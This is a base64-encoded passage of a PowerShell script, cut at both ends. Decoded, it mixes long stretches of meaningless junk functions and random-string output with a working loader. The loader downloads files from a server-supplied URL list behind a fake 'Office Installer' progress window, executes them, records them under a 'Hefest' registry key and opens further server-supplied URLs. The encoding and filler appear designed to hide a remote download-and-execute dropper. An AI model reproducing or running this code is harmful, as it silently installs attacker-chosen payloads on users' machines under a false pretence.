gNjYgLXBhcmFtMiA3MApXcml0ZS1PdXRwdXQgJ1plTVR1eEhMOXZ0Q2cycicKJHZhcl9GTUh4b1hJNSA9IGZuX25YeG0yVUpxIC1wYXJhbTEgNTAgLXBhcmFtMiAzNwpXcml0ZS1Ib3N0ICd1MmZMT2RWOFBlRUdOZzMnCiR2YXJfWENUZ0s5QTggPSBmbl83RXVzQ3pIOSAtcGFyYW0xIDQyIC1wYXJhbTIgNDcKV3JpdGUtT3V0cHV0ICdUc2tvNml0OEVxR1F1WTMnCiR2YXJfRk1IeG9YSTUgPSBmbl9aMm91SFRYZiAtcGFyYW0xIDczIC1wYXJhbTIgODQKV3JpdGUtSG9zdCAnZVJnS3d5QUR1RXZKMThyJwokdmFyX1hDVGdLOUE4ID0gZm5fN0V1c0N6SDkgLXBhcmFtMSAyMiAtcGFyYW0yIDMKV3JpdGUtT3V0cHV0ICdRNWcxUmtiaURzMG9UOU8nCiR2YXJfWENUZ0s5QTggPSBmbl9uWHhtMlVKcSAtcGFyYW0xIDM0IC1wYXJhbTIgNzkKV3JpdGUtT3V0cHV0ICdqWGxCWkdNaFdFRGFudnonCiR2YXJfZlNSVlRaMUMgPSBmbl83RXVzQ3pIOSAtcGFyYW0xIDYgLXBhcmFtMiA5MApXcml0ZS1PdXRwdXQgJ294OUNRVlhLYnl3SFdJTycKJHZhcl82aENTZ3ZmVyA9IGZuX1oyb3VIVFhmIC1wYXJhbTEgMjYgLXBhcmFtMiA1NQpXcml0ZS1Ib3N0ICdXN3NvTEF6MUhyNFVsVk8nCiR2YXJfZlNSVlRaMUMgPSBmbl9YbkRXd0x5ZSAtcGFyYW0xIDYzIC1wYXJhbTIgOTUKV3JpdGUtT3V0cHV0ICdoWjFPM3h0dW5FTERWTkcnCiR2YXJfWENUZ0s5QTggPSBmbl83RXVzQ3pIOSAtcGFyYW0xIDQyIC1wYXJhbTIgOTMKV3JpdGUtT3V0cHV0ICdDUGNicFRKV21HVlM5dUwnCiR2YXJfNmhDU2d2ZlcgPSBmbl83RXVzQ3pIOSAtcGFyYW0xIDc0IC1wYXJhbTIgNjMKV3JpdGUtSG9zdCAnZUhEdzNHNHNjVzZsTVlOJwokdmFyX2ZTUlZUWjFDID0gZm5fWG5EV3dMeWUgLXBhcmFtMSAxNSAtcGFyYW0yIDkwCldyaXRlLUhvc3QgJ0RCOE1uNVBoaXJhOXZOWCcKJHZhcl9YQ1RnSzlBOCA9IGZuX1huRFd3THllIC1wYXJhbTEgNTEgLXBhcmFtMiA3NQpXcml0ZS1Ib3N0ICd0alN3OVFLZUFkRUlYUlYnCiR2YXJfQmdZNDhVSnEgPSBmbl9qbVZ5MEhQQiAtcGFyYW0xIDkwIC1wYXJhbTIgMTgKV3JpdGUtT3V0cHV0ICdrSjREWFlFN3JXejBPaVMnCiAKCg0KCgoNCg0KZnVuY3Rpb24gR2V0LUZpbGVOYW1lRnJvbVVyaSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR1cmkNCiAgICApDQoNCiAgICAjIENyZWF0ZSBhIFVyaSBvYmplY3QNCiAgICAkdXJpT2JqZWN0ID0gW1N5c3RlbS5VcmldOjpuZXcoJHVyaSkNCg0KICAgICMgRXh0cmFjdCB0aGUgZmlsZSBuYW1lIGZyb20gdGhlIHBhdGggb2YgdGhlIFVSSQ0KICAgICRmaWxlTmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCR1cmlPYmplY3QuQWJzb2x1dGVQYXRoKQ0KDQogICAgcmV0dXJuICRmaWxlTmFtZQ0KfQ0KDQpmdW5jdGlvbiBBZGQtUmFuZG9tRGlnaXRzVG9GaWxlbmFtZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSRmaWxlTmFtZQ0KICAgICkNCg0KICAgICMgU3BsaXQgZmlsZW5hbWUgaW50byBiYXNlIGFuZCBleHRlbnNpb24NCiAgICAkYmFzZU5hbWUgPSAkZmlsZU5hbWUgLXJlcGxhY2UgJ1wuW14uXSskJywgJycNCiAgICAkZXh0ZW5zaW9uID0gJGZpbGVOYW1lIC1yZXBsYWNlICcuKlwuJywgJy4nDQoNCiAgICAjIEdlbmVyYXRlIGEgcmFuZG9tIG51bWJlciBiZXR3ZWVuIDEwMDAgYW5kIDk5OTkNCiAgICAkcmFuZG9tTnVtYmVyID0gR2V0LVJhbmRvbSAtTWluaW11bSAxMDAwIC1NYXhpbXVtIDk5OTkNCg0KICAgICMgQ29tYmluZSBiYXNlIG5hbWUsIHJhbmRvbSBudW1iZXIsIGFuZCBleHRlbnNpb24NCiAgICAkbmV3RmlsZU5hbWUgPSAiJGJhc2VOYW1lIiArICJfJHJhbmRvbU51bWJlciRleHRlbnNpb24iDQoNCiAgICByZXR1cm4gJG5ld0ZpbGVOYW1lDQp9DQoNCmZ1bmN0aW9uIFN0YXJ0LURvd25sb2FkQW5kRXhlY3V0ZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR1cmwsDQogICAgICAgIFtzdHJpbmddJHRpdGxlDQogICAgKQ0KDQogICAgQWRkLVR5cGUgLUFzc2VtYmx5TmFtZSBTeXN0ZW0uV2luZG93cy5Gb3Jtcw0KICAgIEFkZC1UeXBlIC1Bc3NlbWJseU5hbWUgU3lzdGVtLkRyYXdpbmcNCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIGZvcm0NCiAgICAkZm9ybSA9IE5ldy1PYmplY3QgU3lzdGVtLldpbmRvd3MuRm9ybXMuRm9ybQ0KICAgICRmb3JtLlRleHQgPSAkdGl0bGUNCiAgICAkZm9ybS5TaXplID0gTmV3LU9iamVjdCBTeXN0ZW0uRHJhd2luZy5TaXplKDQwMCwgMjAwKQ0KICAgICRmb3JtLlN0YXJ0UG9zaXRpb24gPSAiQ2VudGVyU2NyZWVuIg0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgcHJvZ3Jlc3MgYmFyDQogICAgJHByb2dyZXNzQmFyID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5Qcm9ncmVzc0Jhcg0KICAgICRwcm9ncmVzc0Jhci5NaW5pbXVtID0gMA0KICAgICRwcm9ncmVzc0Jhci5NYXhpbXVtID0gMTAwDQogICAgJHByb2dyZXNzQmFyLlN0ZXAgPSAxDQogICAgJHByb2dyZXNzQmFyLlZhbHVlID0gMA0KICAgICRwcm9ncmVzc0Jhci5XaWR0aCA9IDM1MA0KICAgICRwcm9ncmVzc0Jhci5IZWlnaHQgPSAzMA0KICAgICRwcm9ncmVzc0Jhci5Ub3AgPSA4MA0KICAgICRwcm9ncmVzc0Jhci5MZWZ0ID0gMjANCiAgICAkZm9ybS5Db250cm9scy5BZGQoJHByb2dyZXNzQmFyKQ0KDQogICAgIyBDcmVhdGUgYW5kIGNvbmZpZ3VyZSB0aGUgc3RhdHVzIGxhYmVsDQogICAgJHN0YXR1c0xhYmVsID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5MYWJlbA0KICAgICRzdGF0dXNMYWJlbC5UZXh0ID0gIkRvd25sb2FkaW5nLi4uIg0KICAgICRzdGF0dXNMYWJlbC5BdXRvU2l6ZSA9ICR0cnVlDQogICAgJHN0YXR1c0xhYmVsLlRvcCA9IDUwDQogICAgJHN0YXR1c0xhYmVsLkxlZnQgPSAyMA0KICAgICRmb3JtLkNvbnRyb2xzLkFkZCgkc3RhdHVzTGFiZWwpDQoNCiAgICAjIENyZWF0ZSBhbmQgY29uZmlndXJlIHRoZSBkZXNjcmlwdGlvbiBsYWJlbA0KICAgICRkZXNjcmlwdGlvbkxhYmVsID0gTmV3LU9iamVjdCBTeXN0ZW0uV2luZG93cy5Gb3Jtcy5MYWJlbA0KICAgICRkZXNjcmlwdGlvbkxhYmVsLlRleHQgPSAiVGhlIGluc3RhbGxlciBpcyBjdXJyZW50bHkgYmVpbmcgZG93bmxvYWRlZC4gUGxlYXNlIHdhaXQgdW50aWwgdGhlIHByb2Nlc3MgY29tcGxldGVzLiINCiAgICAkZGVzY3JpcHRpb25MYWJlbC5BdXRvU2l6ZSA9ICR0cnVlDQogICAgJGRlc2NyaXB0aW9uTGFiZWwuV2lkdGggPSAzNTANCiAgICAkZGVzY3JpcHRpb25MYWJlbC5Ub3AgPSAxMA0KICAgICRkZXNjcmlwdGlvbkxhYmVsLkxlZnQgPSAyMA0KICAgICRmb3JtLkNvbnRyb2xzLkFkZCgkZGVzY3JpcHRpb25MYWJlbCkNCg0KICAgICMgU2hvdyB0aGUgZm9ybSBub24tbW9kYWxseQ0KICAgICRmb3JtLlNob3coKQ0KDQogICAgIyBEZXRlcm1pbmUgdGhlIGZpbGUgbmFtZSBhbmQgcGF0aA0KICAgICRmaWxlTmFtZSA9IEdldC1GaWxlTmFtZUZyb21VcmkgLXVyaSAkdXJsDQogICAgJGZpbGVOYW1lID0gQWRkLVJhbmRvbURpZ2l0c1RvRmlsZW5hbWUgLWZpbGVOYW1lICRmaWxlTmFtZQ0KDQogICAgJHRlbXBEaXIgPSAoU3BsaXQtUGF0aCAtUGF0aCAkUFNDb21tYW5kUGF0aCkNCiAgICAkaW5zdGFsbGVyUGF0aCA9IFtTeXN0ZW0uSU8uUGF0aF06OkNvbWJpbmUoJHRlbXBEaXIsICRmaWxlTmFtZSkNCg0KICAgICMgQ3JlYXRlIGFuZCBjb25maWd1cmUgdGhlIFdlYkNsaWVudA0KICAgICR3ZWJDbGllbnQgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50DQoNCiAgICAjIERlZmluZSBldmVudCBoYW5kbGVycw0KICAgICRwcm9ncmVzc0NoYW5nZWRIYW5kbGVyID0gW1N5c3RlbS5OZXQuRG93bmxvYWRQcm9ncmVzc0NoYW5nZWRFdmVudEhhbmRsZXJdew0KICAgICAgICBwYXJhbSAoJHNlbmRlciwgJGV2ZW50QXJncykNCiAgICAgICAgJHByb2dyZXNzQmFyLlZhbHVlID0gJGV2ZW50QXJncy5Qcm9ncmVzc1BlcmNlbnRhZ2UNCiAgICAgICAgJGZvcm0uUmVmcmVzaCgpDQogICAgfQ0KDQogICAgJGRvd25sb2FkRmlsZUNvbXBsZXRlZEhhbmRsZXIgPSBbU3lzdGVtLkNvbXBvbmVudE1vZGVsLkFzeW5jQ29tcGxldGVkRXZlbnRIYW5kbGVyXXsNCiAgICAgICAgcGFyYW0gKCRzZW5kZXIsICRldmVudEFyZ3MpDQogICAgICAgICMgQ2xvc2UgdGhlIGZvcm0gYmVmb3JlIHN0YXJ0aW5nIHRoZSBpbnN0YWxsZXINCiAgICAgICAgJGZvcm0uSW52b2tlKFthY3Rpb25dIHsgJGZvcm0uQ2xvc2UoKSB9KQ0KICAgICAgICANCiAgICAgICAgaWYgKCRldmVudEFyZ3MuRXJyb3IpIHsNCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6U2hvdygiRXJyb3IgZG93bmxvYWRpbmcgZmlsZTogIiArICRldmVudEFyZ3MuRXJyb3IuTWVzc2FnZSwgIkRvd25sb2FkIEVycm9yIiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hCdXR0b25zXTo6T0ssIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94SWNvbl06OkVycm9yKQ0KICAgICAgICB9IGVsc2VpZiAoJGV2ZW50QXJncy5DYW5jZWxsZWQpIHsNCiAgICAgICAgICAgIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94XTo6U2hvdygiRG93bmxvYWQgY2FuY2VsbGVkLiIsICJEb3dubG9hZCBDYW5jZWxsZWQiLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEJ1dHRvbnNdOjpPSywgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hJY29uXTo6V2FybmluZykNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgIyBFeGVjdXRlIHRoZSBpbnN0YWxsZXINCiAgICAgICAgICAgICAgICBTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkaW5zdGFsbGVyUGF0aCAtV2FpdA0KDQogICAgICAgICAgICAgICAgIyBXcml0ZSB0byB0aGUgcmVnaXN0cnkNCiAgICAgICAgICAgICAgICAkcmVnaXN0cnlQYXRoID0gIkhLQ1U6XFNvZnR3YXJlXEhlZmVzdFxEb3dubG9hZHMiDQogICAgICAgICAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcmVnaXN0cnlQYXRoKSkgew0KICAgICAgICAgICAgICAgICAgICBOZXctSXRlbSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1Gb3JjZSB8IE91dC1OdWxsDQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIFNldC1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAkZmlsZU5hbWUgLVZhbHVlICJEb3dubG9hZGVkIg0KICAgICAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJFcnJvciBleGVjdXRpbmcgdGhlIGluc3RhbGxlcjogIiArICRfLkV4Y2VwdGlvbi5NZXNzYWdlLCAiRXhlY3V0aW9uIEVycm9yIiwgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hCdXR0b25zXTo6T0ssIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94SWNvbl06OkVycm9yKQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgIyBBZGQgZXZlbnQgaGFuZGxlcnMgdG8gV2ViQ2xpZW50DQogICAgJHdlYkNsaWVudC5hZGRfRG93bmxvYWRQcm9ncmVzc0NoYW5nZWQoJHByb2dyZXNzQ2hhbmdlZEhhbmRsZXIpDQogICAgJHdlYkNsaWVudC5hZGRfRG93bmxvYWRGaWxlQ29tcGxldGVkKCRkb3dubG9hZEZpbGVDb21wbGV0ZWRIYW5kbGVyKQ0KDQogICAgdHJ5IHsNCiAgICAgICAgIyBTdGFydCB0aGUgZG93bmxvYWQNCiAgICAgICAgJHdlYkNsaWVudC5Eb3dubG9hZEZpbGVBc3luYyhbVXJpXSR1cmwsICRpbnN0YWxsZXJQYXRoKQ0KICAgICAgICANCiAgICAgICAgIyBLZWVwIHRoZSBmb3JtIHJlc3BvbnNpdmUgd2hpbGUgdGhlIGRvd25sb2FkIGlzIGluIHByb2dyZXNzDQogICAgICAgIHdoaWxlICgkZm9ybS5WaXNpYmxlKSB7DQogICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAxDQogICAgICAgICAgICBbU3lzdGVtLldpbmRvd3MuRm9ybXMuQXBwbGljYXRpb25dOjpEb0V2ZW50cygpDQogICAgICAgIH0NCiAgICB9IGNhdGNoIHsNCiAgICAgICAgW1N5c3RlbS5XaW5kb3dzLkZvcm1zLk1lc3NhZ2VCb3hdOjpTaG93KCJFcnJvciBpbml0aWF0aW5nIGRvd25sb2FkOiAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UsICJEb3dubG9hZCBFcnJvciIsIFtTeXN0ZW0uV2luZG93cy5Gb3Jtcy5NZXNzYWdlQm94QnV0dG9uc106Ok9LLCBbU3lzdGVtLldpbmRvd3MuRm9ybXMuTWVzc2FnZUJveEljb25dOjpFcnJvcikNCiAgICAgICAgJGZvcm0uQ2xvc2UoKQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gRG93bmxvYWQgew0KICAgIHBhcmFtICgNCiAgICAgICAgW3N0cmluZ10kdXJsLA0KICAgICAgICBbc3RyaW5nXSR0aXRsZQ0KICAgICkNCg0KICAgICRmaWxlTmFtZSA9IFtTeXN0ZW0uSU8uUGF0aF06OkdldEZpbGVOYW1lKCR1cmwpDQoNCiAgICBpZiAoVGVzdC1BdXRvc3RhcnQgLWVxICR0cnVlKQ0KICAgIHsNCiAgICAgICAgJHJlZ2lzdHJ5UGF0aCA9ICJIS0NVOlxTb2Z0d2FyZVxIZWZlc3RcRG93bmxvYWRzIg0KICAgICAgICBpZiAoVGVzdC1QYXRoICRyZWdpc3RyeVBhdGgpIHsNCiAgICAgICAgICAgICRpbnN0YWxsZWQgPSBHZXQtSXRlbVByb3BlcnR5IC1QYXRoICRyZWdpc3RyeVBhdGggLU5hbWUgJGZpbGVOYW1lIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICBpZiAoJGluc3RhbGxlZCkgDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJUaGUgZmlsZSAnJGZpbGVOYW1lJyBpcyBhbHJlYWR5IGluc3RhbGxlZC4iDQogICAgICAgICAgICAgICAgcmV0dXJuDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuDQogICAgfQ0KDQogICAgU3RhcnQtRG93bmxvYWRBbmRFeGVjdXRlIC11cmwgJHVybCAtdGl0bGUgJHRpdGxlDQp9DQoNCmZ1bmN0aW9uIERvU3RhcnREb3dubG9hZHMgew0KICAgIHRyeSANCiAgICB7DQogICAgICAgIGZvcmVhY2ggKCR1cmwgaW4gJHNlcnZlci5zdGFydERvd25sb2FkcykNCiAgICAgICAgew0KICAgICAgICAgICAgRG93bmxvYWQgLXVybCAkdXJsIC10aXRsZSAiRG93bmxvYWRpbmcgT2ZmaWNlIEluc3RhbGxlciINCiAgICAgICAgfQ0KICAgIH0NCiAgICBjYXRjaCB7DQogICAgICBXcml0ZS1FcnJvciAiQW4gZXJyb3Igb2NjdXJyZWQgKFN0YXJ0IERvd25sb2Fkcyk6ICRfIg0KICAgIH0NCn0NCmZ1bmN0aW9uIGZuX0xvZ19LT0V2dUwyaCB7CiAgICBwYXJhbSAoCiAgICAgICAgW3N0cmluZ10kbWVzc2FnZQogICAgKQogICAgV3JpdGUtT3V0cHV0ICdMb2c6ICRtZXNzYWdlJwp9CmZ1bmN0aW9uIGZuX3NyRUdLeWtUIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfVWV0dXhuejksCiAgICAgICAgW2ludF0kdmFyX3JPU01SOWtECiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9VZXR1eG56OSArICR2YXJfck9TTVI5a0QKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fT1liQVZDVWYgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9yT1NNUjlrRCwKICAgICAgICBbaW50XSR2YXJfUkoyT3JpN2gKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX3JPU01SOWtEICsgJHZhcl9SSjJPcmk3aAogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl90dm9RSTQwMyB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX1JKMk9yaTdoLAogICAgICAgIFtpbnRdJHZhcl9tTU4zZG9FdwogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfUkoyT3JpN2ggKyAkdmFyX21NTjNkb0V3CiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuX3V0RUJBNlNzIHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfbU1OM2RvRXcsCiAgICAgICAgW2ludF0kdmFyX3FIVmZhTHZwCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9tTU4zZG9FdyArICR2YXJfcUhWZmFMdnAKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fSktwbmN0c3kgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9xSFZmYUx2cCwKICAgICAgICBbaW50XSR2YXJfVWV0dXhuejkKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX3FIVmZhTHZwICsgJHZhcl9VZXR1eG56OQogICAgcmV0dXJuICRyZXN1bHQKfQppZiAoJHZhcl9VZXR1eG56OSAtZ3QgMTIpIHsKICAgIFdyaXRlLU91dHB1dCAnUVVsaTZ2d05DVnNBdTk0Jwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnQmVwYXN1em14MlNrY1JRJwp9CmlmICgkdmFyX3JPU01SOWtEIC1ndCAxOCkgewogICAgV3JpdGUtT3V0cHV0ICdpWms4RmVWdWIwZ3hhTGYnCn0gZWxzZSB7CiAgICBXcml0ZS1PdXRwdXQgJ1RyMTYyZUtRQ2ZwTGgzUycKfQppZiAoJHZhcl9SSjJPcmk3aCAtZ3QgMTgpIHsKICAgIFdyaXRlLUhvc3QgJzBVMkgzTTZPd0liMUVTYScKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAneVdmcXZtYVh6VUExeHI2Jwp9CmlmICgkdmFyX21NTjNkb0V3IC1ndCAxNikgewogICAgV3JpdGUtSG9zdCAncW5vRXBLcjI4TzE2aXREJwp9IGVsc2UgewogICAgV3JpdGUtT3V0cHV0ICd0cWVHZEtnazVVVFE3bFonCn0KaWYgKCR2YXJfcUhWZmFMdnAgLWd0IDYpIHsKICAgIFdyaXRlLUhvc3QgJ1BuZUhEMVpsRmYyRUtZdCcKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnU0Z0b0VqTEFNaE5wSkttJwp9CiR2YXJfVWV0dXhuejkgPSBmbl9KS3BuY3RzeSAtcGFyYW0xIDIxIC1wYXJhbTIgMTAKV3JpdGUtSG9zdCAnYXd6NG1MY1VQVHlCamxKJwokdmFyX1JKMk9yaTdoID0gZm5fT1liQVZDVWYgLXBhcmFtMSA0MiAtcGFyYW0yIDEKV3JpdGUtSG9zdCAnU3JRMDJKWHlDV1pUamk4JwokdmFyX3FIVmZhTHZwID0gZm5fc3JFR0t5a1QgLXBhcmFtMSAxNCAtcGFyYW0yIDk3CldyaXRlLU91dHB1dCAnTzZhS1pEdmJFVGtXZGhRJwokdmFyX3JPU01SOWtEID0gZm5fc3JFR0t5a1QgLXBhcmFtMSAxMSAtcGFyYW0yIDkKV3JpdGUtSG9zdCAnU09xajlJZW5ydDNEVmw2JwokdmFyX3JPU01SOWtEID0gZm5fdXRFQkE2U3MgLXBhcmFtMSA2NCAtcGFyYW0yIDczCldyaXRlLU91dHB1dCAnd1VXbTNwOWd6WWRvYzdaJwokdmFyX3FIVmZhTHZwID0gZm5fdXRFQkE2U3MgLXBhcmFtMSAzMCAtcGFyYW0yIDM5CldyaXRlLUhvc3QgJzRmZGJxS0FXeGNFSU9TcCcKJHZhcl9xSFZmYUx2cCA9IGZuX3NyRUdLeWtUIC1wYXJhbTEgNyAtcGFyYW0yIDk5CldyaXRlLUhvc3QgJ0x3NFdaS2xFMjhRVVBpNycKJHZhcl9SSjJPcmk3aCA9IGZuX0pLcG5jdHN5IC1wYXJhbTEgMjUgLXBhcmFtMiA5NwpXcml0ZS1PdXRwdXQgJ2lSWkRMQmcxVDkwcnVlaycKJHZhcl9SSjJPcmk3aCA9IGZuX3R2b1FJNDAzIC1wYXJhbTEgMzggLXBhcmFtMiA1OApXcml0ZS1Ib3N0ICdSQ0ljQmZXQXI3SnM2Wm8nCiR2YXJfVWV0dXhuejkgPSBmbl9PWWJBVkNVZiAtcGFyYW0xIDkxIC1wYXJhbTIgODcKV3JpdGUtT3V0cHV0ICduUmN4dm9nMmRGaU5zN1EnCiR2YXJfVWV0dXhuejkgPSBmbl91dEVCQTZTcyAtcGFyYW0xIDYwIC1wYXJhbTIgNzIKV3JpdGUtSG9zdCAnZFpoSFVnd3hOUlZMbmZxJwokdmFyX1JKMk9yaTdoID0gZm5fdHZvUUk0MDMgLXBhcmFtMSA3NiAtcGFyYW0yIDU2CldyaXRlLUhvc3QgJzkwSmNvYk1Lazh4aUc1NycKJHZhcl9tTU4zZG9FdyA9IGZuX3V0RUJBNlNzIC1wYXJhbTEgMzQgLXBhcmFtMiA5MgpXcml0ZS1Ib3N0ICdCWVNyWGx4SmRpeW1Jc0gnCiR2YXJfVWV0dXhuejkgPSBmbl9zckVHS3lrVCAtcGFyYW0xIDk0IC1wYXJhbTIgNzUKV3JpdGUtT3V0cHV0ICd2aTQ2QldKZlJ4S1lha1gnCiR2YXJfVWV0dXhuejkgPSBmbl9zckVHS3lrVCAtcGFyYW0xIDMzIC1wYXJhbTIgMjgKV3JpdGUtSG9zdCAnRllSRTBwN3ZQdE9rZmdCJwokdmFyX1JKMk9yaTdoID0gZm5fdHZvUUk0MDMgLXBhcmFtMSAyNCAtcGFyYW0yIDczCldyaXRlLUhvc3QgJ3ZZZDRMWnVsdzl0RTh6cycKJHZhcl9yT1NNUjlrRCA9IGZuX3NyRUdLeWtUIC1wYXJhbTEgNTcgLXBhcmFtMiAyMApXcml0ZS1PdXRwdXQgJ3Y3bHhDd3pXUEx5UVROdCcKJHZhcl9SSjJPcmk3aCA9IGZuX3NyRUdLeWtUIC1wYXJhbTEgNjYgLXBhcmFtMiAxCldyaXRlLUhvc3QgJ2hTbHdxTmQ3UFZ6REZROScKJHZhcl9tTU4zZG9FdyA9IGZuX3NyRUdLeWtUIC1wYXJhbTEgODggLXBhcmFtMiA3OApXcml0ZS1PdXRwdXQgJ3VwOHFUSkE3TTBpNmJTRScKJHZhcl9VZXR1eG56OSA9IGZuX3R2b1FJNDAzIC1wYXJhbTEgNTcgLXBhcmFtMiAxNApXcml0ZS1Ib3N0ICdHaHI0bzcxTEhKeWlqblInCiAKCg0KCgoNCg0KDQoNCmZ1bmN0aW9uIERvU3RhcnRVcmxzIHsNCiAgICB0cnkNCiAgICAgICAgew0KICAgICAgICBmb3JlYWNoICgkc3RhcnRVcmwgaW4gJHNlcnZlci5zdGFydFVybHMpIHsNCiAgICAgICAgICAgIFN0YXJ0LVByb2Nlc3MgJHN0YXJ0VXJsLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgIGNhdGNoDQogICAgew0KICAgICAgV3JpdGUtRXJyb3IgIkFuIGVycm9yIG9jY3VycmVkIChTdGFydCBVcmxzKTogJF8iDQogICAgfQ0KfQ0KZnVuY3Rpb24gZm5fTG9nX2Q3T2VBOVRvIHsKICAgIHBhcmFtICgKICAgICAgICBbc3RyaW5nXSRtZXNzYWdlCiAgICApCiAgICBXcml0ZS1PdXRwdXQgJ0xvZzogJG1lc3NhZ2UnCn0KZnVuY3Rpb24gZm5fWkNrdEtQZmwgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9RZEY5VzE2NSwKICAgICAgICBbaW50XSR2YXJfdEVjWlQ0VzkKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX1FkRjlXMTY1ICsgJHZhcl90RWNaVDRXOQogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9YakhPZnpNViB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX3RFY1pUNFc5LAogICAgICAgIFtpbnRdJHZhcl9YWkI4U0VwdwogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfdEVjWlQ0VzkgKyAkdmFyX1haQjhTRXB3CiAgICByZXR1cm4gJHJlc3VsdAp9CmZ1bmN0aW9uIGZuXzJpQ2x1ZVY5IHsKICAgIHBhcmFtICgKICAgICAgICBbaW50XSR2YXJfWFpCOFNFcHcsCiAgICAgICAgW2ludF0kdmFyX1RnT3E4S2QxCiAgICApCiAgICAkcmVzdWx0ID0gJHZhcl9YWkI4U0VwdyArICR2YXJfVGdPcThLZDEKICAgIHJldHVybiAkcmVzdWx0Cn0KZnVuY3Rpb24gZm5fM0ROZlhKNnkgewogICAgcGFyYW0gKAogICAgICAgIFtpbnRdJHZhcl9UZ09xOEtkMSwKICAgICAgICBbaW50XSR2YXJfSmhmSFhsS3IKICAgICkKICAgICRyZXN1bHQgPSAkdmFyX1RnT3E4S2QxICsgJHZhcl9KaGZIWGxLcgogICAgcmV0dXJuICRyZXN1bHQKfQpmdW5jdGlvbiBmbl9ZdUhGTzZ2aCB7CiAgICBwYXJhbSAoCiAgICAgICAgW2ludF0kdmFyX0poZkhYbEtyLAogICAgICAgIFtpbnRdJHZhcl9RZEY5VzE2NQogICAgKQogICAgJHJlc3VsdCA9ICR2YXJfSmhmSFhsS3IgKyAkdmFyX1FkRjlXMTY1CiAgICByZXR1cm4gJHJlc3VsdAp9CmlmICgkdmFyX1FkRjlXMTY1IC1ndCA0KSB7CiAgICBXcml0ZS1PdXRwdXQgJ2luVDdsOEdLeE1kZVlBNScKfSBlbHNlIHsKICAgIFdyaXRlLU91dHB1dCAnMGxLOGExeFNJQVFrTm5QJwp9CmlmICgkdmFyX3RFY1pUNFc5IC1ndCAxOSkgewogICAgV3JpdGUtSG9zdCAneVZCMU5GOGxYZmhIaXJjJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnRU0zY2hHbUlmSmFkRndBJwp9CmlmICgkdmFyX1haQjhTRXB3IC1ndCAxOCkgewogICAgV3JpdGUtSG9zdCAneTdPYkZxSWVtUlVDQXRwJwp9IGVsc2UgewogICAgV3JpdGUtSG9zdCAnR3hlSkt1WXlSVmhYZk1xJwp9CmlmICgkdmFyX1RnT3E4S2QxIC1ndCAyKSB7CiAgICBXcml0ZS1PdXRwdXQgJzgyZ2xybk02NFlLeUZmdicKfSBlbHNlIHsKICAgIFdyaXRlLUhvc3QgJzNQeTJJQlNpV3oxd0NsOScKfQppZiAoJHZhcl9K